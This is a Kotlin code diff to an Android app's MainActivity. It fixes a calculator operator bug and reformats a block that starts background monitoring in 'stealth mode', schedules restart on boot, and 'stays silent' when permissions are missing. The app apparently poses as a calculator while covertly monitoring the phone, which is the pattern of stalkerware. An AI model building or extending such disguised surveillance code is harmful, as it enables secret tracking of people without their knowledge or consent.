@@ -155,7 +155,13 @@ class MainActivity : AppCompatActivity() {
             clear()
             return
         }
-        if (currentNumber.isEmpty()) return
+        if (currentNumber.isEmpty()) {
+            if (previousNumber.isNotEmpty()) {
+                operator = op
+                updateCalculatorDisplay()
+            }
+            return
+        }
         if (previousNumber.isNotEmpty()) {
             calculate()
             if (currentNumber == "Error" || currentNumber.isEmpty()) return
@@ -271,13 +277,13 @@ class MainActivity : AppCompatActivity() {
             }
             if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Starting monitoring in background (stealth mode)")
             if (!preferencesManager.isConfigured()) {
-            if (BuildConfig.DEBUG) android.util.Log.e("MainActivity", "Not configured - cannot start monitoring")
-            try {
-                MessageScheduler.scheduleBootRestart(this)
-            } catch (_: Exception) {
+                if (BuildConfig.DEBUG) android.util.Log.e("MainActivity", "Not configured - cannot start monitoring")
+                try {
+                    MessageScheduler.scheduleBootRestart(this)
+                } catch (_: Exception) {
+                }
+                return
             }
-            return
-        }
         
         if (!hasAllPermissions()) {
             if (BuildConfig.DEBUG) android.util.Log.w("MainActivity", "Permissions missing - staying silent, grant via Setup")
